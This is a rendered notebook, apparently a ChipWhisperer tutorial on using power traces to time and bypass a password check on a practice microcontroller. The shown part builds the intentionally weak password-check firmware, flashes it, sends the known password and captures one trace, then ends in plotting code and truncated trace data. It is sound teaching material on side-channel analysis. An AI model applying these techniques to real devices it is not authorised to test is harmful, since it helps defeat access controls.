
Timing Analysis with Power for Password Bypass
==============================================

Supported setups:

SCOPES:

-  OPENADC
-  CWNANO

PLATFORMS:

-  CWLITEARM
-  CWLITEXMEGA
-  CWNANO

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'CWNANO'
    PLATFORM = 'CWNANO'
    CRYPTO_TARGET = 'NONE'

Firmware
--------

Like before, we'll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWNANO.hex
    rm -f -- basic-passwdcheck-CWNANO.eep
    rm -f -- basic-passwdcheck-CWNANO.cof
    rm -f -- basic-passwdcheck-CWNANO.elf
    rm -f -- basic-passwdcheck-CWNANO.map
    rm -f -- basic-passwdcheck-CWNANO.sym
    rm -f -- basic-passwdcheck-CWNANO.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s stm32f0_hal_nano.s stm32f0_hal_lowlevel.s
    rm -f -- basic-passwdcheck.d simpleserial.d stm32f0_hal_nano.d stm32f0_hal_lowlevel.d
    rm -f -- basic-passwdcheck.i simpleserial.i stm32f0_hal_nano.i stm32f0_hal_lowlevel.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f0_nano/stm32f0_hal_nano.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f0_hal_nano.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f0_hal_nano.o.d .././hal/stm32f0_nano/stm32f0_hal_nano.c -o objdir/stm32f0_hal_nano.o 
    .
    Compiling C: .././hal/stm32f0/stm32f0_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f0_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f0_hal_lowlevel.o.d .././hal/stm32f0/stm32f0_hal_lowlevel.c -o objdir/stm32f0_hal_lowlevel.o 
    .
    Assembling: .././hal/stm32f0/stm32f0_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m0 -I. -x assembler-with-cpp -mthumb -mfloat-abi=soft -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f0_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ .././hal/stm32f0/stm32f0_startup.S -o objdir/stm32f0_startup.o
    .
    Linking: basic-passwdcheck-CWNANO.elf
    arm-none-eabi-gcc -mcpu=cortex-m0 -I. -mthumb -mfloat-abi=soft -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F030x6 -DSTM32F0 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f0_nano -DPLATFORM=CWNANO -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f0 -I.././hal/stm32f0/CMSIS -I.././hal/stm32f0/CMSIS/core -I.././hal/stm32f0/CMSIS/device -I.././hal/stm32f0/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWNANO.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/stm32f0_hal_nano.o objdir/stm32f0_hal_lowlevel.o objdir/stm32f0_startup.o --output basic-passwdcheck-CWNANO.elf --specs=nano.specs --specs=nosys.specs -T .././hal/stm32f0_nano/LinkerScript.ld -Wl,--gc-sections -lm -mthumb -mcpu=cortex-m0  -Wl,-Map=basic-passwdcheck-CWNANO.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWNANO.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWNANO.elf basic-passwdcheck-CWNANO.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWNANO.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWNANO.elf basic-passwdcheck-CWNANO.eep \|\| exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWNANO.lss
    arm-none-eabi-objdump -h -S -z basic-passwdcheck-CWNANO.elf > basic-passwdcheck-CWNANO.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWNANO.sym
    arm-none-eabi-nm -n basic-passwdcheck-CWNANO.elf > basic-passwdcheck-CWNANO.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       5384	    112	   1184	   6680	   1a18	basic-passwdcheck-CWNANO.elf
    +--------------------------------------------------------
    + Built for platform CWNANO STM32F030
    +--------------------------------------------------------





.. parsed-literal::

    .././simpleserial/simpleserial.c: In function 'simpleserial_get':
    .././simpleserial/simpleserial.c:131:10: warning: variable 'ret' set but not used [-Wunused-but-set-variable]
      uint8_t ret[1];
              ^~~



Setup
-----

Setup is the same as usual, except this time we'll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup_Generic.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    Detected unknown STM32F ID: 0x444
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 5495 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 5495 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we'll need to reset it.

We'll be doing this a lot, so we'll define a function that resets the
target (this function is also available by running
"Helper\_Scripts/Setup.ipynb" as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn't an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decryptin
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see "Access granted, Welcome!":


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this 'sacrificial' device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we'll
arm the scope just before we send our password attempt, then record the
trace as we've done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decryptin[DONE]
    
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    Access granted, Welcome!
    
    


Now that we have a trace, we'll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="58b76179-f299-4c29-8431-777ce910e393"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#58b76179-f299-4c29-8431-777ce910e393');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) {
            if (callback != null)
              callback();
          });
        } finally {
          delete root._bokeh_onload_callbacks
        }
        console.debug("Bokeh: all callbacks have finished");
      }
    
      function load_libs(css_urls, js_urls, callback) {
        if (css_urls == null) css_urls = [];
        if (js_urls == null) js_urls = [];
    
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = css_urls.length + js_urls.length;
    
        function on_load() {
          root._bokeh_is_loading--;
          if (root._bokeh_is_loading === 0) {
            console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
            run_callbacks()
          }
        }
    
        function on_error() {
          console.error("failed to load " + url);
        }
    
        for (var i = 0; i < css_urls.length; i++) {
          var url = css_urls[i];
          const element = document.createElement("link");
          element.onload = on_load;
          element.onerror = on_error;
          element.rel = "stylesheet";
          element.type = "text/css";
          element.href = url;
          console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
          document.body.appendChild(element);
        }
    
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var element = document.createElement('script');
          element.onload = on_load;
          element.onerror = on_error;
          element.async = false;
          element.src = url;
          console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
          document.head.appendChild(element);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.error("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      function inject_raw_css(css) {
        const element = document.createElement("style");
        element.appendChild(document.createTextNode(css));
        document.body.appendChild(element);
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.2.0.min.js"];
      var css_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.css"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {} // ensure no trailing comma for IE
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(css_urls, js_urls, function() {
          console.debug("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="d0e39399-0414-4a6b-9e59-33120d0157ea" data-root-id="1002"></div>
    
    </div>



.. raw:: html

    

    <div id="aa38c31e-6e5d-459a-8b5b-e50adf76b6d5"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#aa38c31e-6e5d-459a-8b5b-e50adf76b6d5');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"dd7463e3-a0f9-4226-99c2-6be12b61ffc5":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"center":[{"id":"1015","type":"Grid"},{"id":"1020","type":"Grid"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1037","type":"GlyphRenderer"}],"title":{"id":"1039","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1025","type":"ResetTool"},{"attributes":{"data_source":{"id":"1034","type":"ColumnDataSource"},"glyph":{"id":"1035","type":"Line"},"hover_glyph":null,"muted_glyph":null,"nonselection_glyph":{"id":"1036","type":"Line"},"selection_glyph":null,"view":{"id":"1038","type":"CDSView"}},"id":"1037","type":"GlyphRenderer"},{"attributes":{},"id":"1026","type":"HelpTool"},{"attributes":{},"id":"1043","type":"BasicTickFormatter"},{"attributes":{},"id":"1046","type":"UnionRenderers"},{"attributes":{"bottom_units":"screen","fill_alpha":{"value":0.5},"fill_color":{"value":"lightgrey"},"left_units":"screen","level":"overlay","line_alpha":{"value":1.0},"line_color":{"value":"black"},"line_dash":[4,4],"line_width":{"value":2},"render_mode":"css","right_units":"screen","top_units":"screen"},"id":"1047","type":"BoxAnnotation"},{"attributes":{"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1035","type":"Line"},{"attributes":{"text":""},"id":"1039","type":"Title"},{"attributes":{},"id":"1041","type":"BasicTickFormatter"},{"attributes":{"callback":null},"id":"1005","type":"DataRange1d"},{"attributes":{},"id":"1045","type":"Selection"},{"attributes":{"callback":null},"id":"1003","type":"DataRange1d"},{"attributes":{},"id":"1007","type":"LinearScale"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"formatter":{"id":"1043","type":"BasicTickFormatter"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{"dimension":1,"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"formatter":{"id":"1041","type":"BasicTickFormatter"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1036","type":"Line"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{"source":{"id":"1034","type":"ColumnDataSource"}},"id":"1038","type":"CDSView"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"overlay":{"id":"1047","type":"BoxAnnotation"}},"id":"1023","type":"BoxZoomTool"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799],"y":{"__ndarray__":"AAAAAAAAvz8AAAAAAMDUPwAAAAAAgMc/AAAAAADA3z8AAAAAAADTPwAAAAAAAMc/AAAAAAAAwj8AAAAAAIDKPwAAAAAAAKw/AAAAAACAwb8AAAAAAAC1PwAAAAAAgMQ/AAAAAAAAvD8AAAAAAEDYPwAAAAAAwN4/AAAAAAAArj8AAAAAAADHPwAAAAAAgNo/AAAAAAAAvj8AAAAAAADHPwAAAAAAAMY/AAAAAADA3z8AAAAAAEDVPwAAAAAAAKw/AAAAAAAA1D8AAAAAAIDbPwAAAAAAAKw/AAAAAACAxz8AAAAAAMDZPwAAAAAAALs/AAAAAACAxT8AAAAAAIDFPwAAAAAAwN8/AAAAAADA1D8AAAAAAACUPwAAAAAAwNE/AAAAAABA2T8AAAAAAACkPwAAAAAAgMU/AAAAAACA2j8AAAAAAAC7PwAAAAAAg